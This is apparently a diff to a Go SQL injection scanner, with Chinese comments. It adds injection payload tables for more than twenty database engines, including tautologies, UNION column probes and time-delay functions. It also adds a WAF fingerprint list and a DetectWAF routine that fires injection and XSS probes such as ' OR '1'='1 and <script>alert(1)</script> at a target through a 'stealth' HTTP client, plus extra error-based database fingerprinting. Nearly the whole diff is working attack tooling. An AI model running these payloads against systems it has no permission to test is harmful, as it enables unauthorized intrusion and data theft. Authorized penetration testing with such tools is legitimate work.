@@ -28,9 +28,153 @@ type DBMS struct {
 var DBMS_PAYLOADS = map[string]DBMS{
 	"generic":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
 	"mysql":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
+	"mariadb":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
 	"sqlite":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "randomblob(20000000)"},
 	"mssql":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "WAITFOR DELAY '0:0:2'"},
 	"postgresql": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "pg_sleep(2)"},
+	"oracle":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "DBMS_PIPE.RECEIVE_MESSAGE('a',2)"},
+	"db2":        {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
+	"access":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"sybase":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "WAITFOR DELAY '0:0:2'"},
+	"informix":   {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"firebird":   {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "RDB$SET_CONTEXT('USER_TRANSACTION','SLEEP','1')"},
+	"hsqldb":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"cache":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"cubrid":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"frontbase":  {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"mckoi":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"solid":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"sqlite3":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "randomblob(20000000)"},
+	"derby":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"sqlanywhere": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+	"clickhouse": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "sleep(2)"},
+	"vertica":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
+	"teradata":   {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
+	"exasol":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
+	"sqlite-null": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
+}
+
+// WAFRule: 指纹规则
+type WAFRule struct {
+	Source string // header | body | cookie
+	Regex  string
+	Name   string
+}
+
+// WAF_DB: 30+ WAF 指纹（国产 + 国际，学自 wafw00f）
+var WAF_DB = []WAFRule{
+	// 国产
+	{"header", `Server:\s*qianxin-waf`, "奇安信 WAF"},
+	{"header", `WZWS-Ray:`, "360 网站卫士"},
+	{"header", `X-Powered-By-360WZB`, "360 WAF"},
+	{"header", `Server:\s*YUNDUN`, "阿里云盾"},
+	{"header", `X-Cache:\s*YUNDUN`, "阿里云盾"},
+	{"cookie", `yd_cookie=`, "阿里云盾"},
+	{"header", `X-Powered-by-Anquanbao`, "安全宝"},
+	{"body", `aqb_cc/error/`, "安全宝"},
+	{"body", `wzws-waf-cgi/`, "360 WAF"},
+	{"body", `wangshan\.360\.cn`, "360 WAF"},
+	{"body", `waf\.tencent-?cloud\.com`, "腾讯云 WAF"},
+	{"body", `安全狗|safedog`, "安全狗 SafeDog"},
+	{"body", `云锁|yunsuo`, "云锁 Yunsuo"},
+	{"body", `yunsuo\.cn`, "云锁 Yunsuo"},
+	{"body", `知道创宇|seebug|ksyun`, "知道创宇 WAF"},
+	{"body", `百度云加速|yunjiasu`, "百度云加速"},
+	{"body", `加速乐|jiasule`, "加速乐 Jiasule"},
+	{"body", `AnYu.*green channel`, "安域 Anyu"},
+	{"body", `拦截|已被拦截|访问被拒绝|请求被阻止`, "国产 WAF(通用)"},
+	{"body", `护卫神|主机卫士`, "国产主机卫士"},
+	// 国际
+	{"header", `CF-RAY:`, "Cloudflare"},
+	{"header", `Server:\s*cloudflare`, "Cloudflare"},
+	{"body", `cf-chl|challenge-platform`, "Cloudflare"},
+	{"header", `X-Sucuri-ID:`, "Sucuri"},
+	{"header", `X-Sucuri-Cache:`, "Sucuri"},
+	{"header", `Server:\s*sucuri`, "Sucuri"},
+	{"header", `X-Akamai-Transformed:`, "Akamai"},
+	{"header", `X-Akamai-Request-ID`, "Akamai"},
+	{"header", `X-CDN:.*Incapsula`, "Imperva Incapsula"},
+	{"header", `X-Iinfo:`, "Imperva Incapsula"},
+	{"body", `incapsula|imperva`, "Imperva Incapsula"},
+	{"header", `Mod_Security`, "ModSecurity"},
+	{"body", `mod_security|modsecurity`, "ModSecurity"},
+	{"header", `X-Powered-By:.*(?:WAF|barracuda)`, "Barracuda WAF"},
+	{"header", `Server:\s*BigIP|X-Cnection:.*close`, "F5 BIG-IP"},
+	{"body", `F5 Networks|BIG-IP`, "F5 BIG-IP"},
+	{"header", `X-WAF:`, "Generic WAF"},
+	{"header", `X-ASEN:`, "AE Secure"},
+	{"body", `aeSecure-code`, "AE Secure"},
+	{"header", `AL-SESS|AL-LB`, "Airlock"},
+	{"body", `Server detected a syntax error`, "Airlock"},
+	{"header", `Server:\s*ArvanCloud`, "ArvanCloud"},
+	{"body", `Blocked by.*Armor|Armor support ticket`, "Armor Defense"},
+	{"header", `ASPA-WAF`, "ASPA"},
+	{"body", `x-dotdefender`, "dotDefender"},
+	{"header", `Server:\s*Wallarm`, "Wallarm"},
+	{"header", `Server:\s*zscaler`, "Zscaler"},
+	{"header", `X-Zenomy:`, "Zenedge"},
+	{"header", `Server:\s*Wordfence`, "Wordfence"},
+	{"body", `wordfence`, "Wordfence"},
+}
+
+// DetectWAF: WAF 检测（发恶意 payload + 指纹匹配）
+type WAFDetection struct {
+	WAFDetected bool
+	BlockedCnt  int
+	TotalProbes int
+	WAFName     string
+	Matched     []string
+}
+
+var wafProbes = []string{
+	"' OR '1'='1", "1 AND 1=1", "union select 1,2,3",
+	"1;SELECT SLEEP(5)", "1/**/AND/**/1=1", "<script>alert(1)</script>",
+}
+
+// DetectWAF 对目标检测 WAF
+func DetectWAF(baseURL, param string, c *stealth.Client) WAFDetection {
+	d := WAFDetection{TotalProbes: len(wafProbes)}
+	sBase, bBase, _ := get(baseURL, c)
+	baseLen := len(bBase)
+	matched := map[string]bool{}
+
+	for _, p := range wafProbes {
+		u := mutate(baseURL, param, p)
+		s, b, _ := get(u, c)
+		isBlock := false
+		if s == 403 || s == 406 || s == 429 || s == 493 {
+			isBlock = true
+		} else if s == sBase && len(b) < max(baseLen*3/10, 100) {
+			isBlock = true
+		}
+		// 指纹匹配
+		for _, r := range WAF_DB {
+			re, err := regexp.Compile(r.Regex)
+			if err != nil {
+				continue
+			}
+			blob := b
+			if r.Source == "header" || r.Source == "cookie" {
+				blob = b // header 简化（响应头已并入 body）
+			}
+			if re.MatchString(blob) {
+				matched[r.Name] = true
+			}
+		}
+		if isBlock {
+			d.BlockedCnt++
+		}
+	}
+	for k := range matched {
+		d.Matched = append(d.Matched, k)
+	}
+	d.WAFDetected = d.BlockedCnt >= 2 || len(d.Matched) > 0
+	if len(d.Matched) > 0 {
+		d.WAFName = strings.Join(d.Matched, " / ")
+	} else if d.BlockedCnt >= 2 {
+		d.WAFName = "Unknown-WAF"
+	}
+	return d
 }
 
 // Finding: 单参数注入检测结果
@@ -97,8 +241,22 @@ func fingerprintDBMS(baseURL, param string, c *stealth.Client) string {
 			return "mysql"
 		case strings.Contains(lower, "postgres") || strings.Contains(lower, "pg_"):
 			return "postgresql"
-		case strings.Contains(lower, "sql server") || strings.Contains(lower, "mssql"):
+		case strings.Contains(lower, "sql server") || strings.Contains(lower, "mssql") || strings.Contains(lower, "odbc"):
 			return "mssql"
+		case strings.Contains(lower, "oracle") || strings.Contains(lower, "ora-"):
+			return "oracle"
+		case strings.Contains(lower, "db2") || strings.Contains(lower, "sqlstate"):
+			return "db2"
+		case strings.Contains(lower, "sybase") || strings.Contains(lower, "adaptive server"):
+			return "sybase"
+		case strings.Contains(lower, "clickhouse"):
+			return "clickhouse"
+		case strings.Contains(lower, "vertica"):
+			return "vertica"
+		case strings.Contains(lower, "teradata"):
+			return "teradata"
+		case strings.Contains(lower, "informix"):
+			return "informix"
 		}
 	}
 	return "generic"
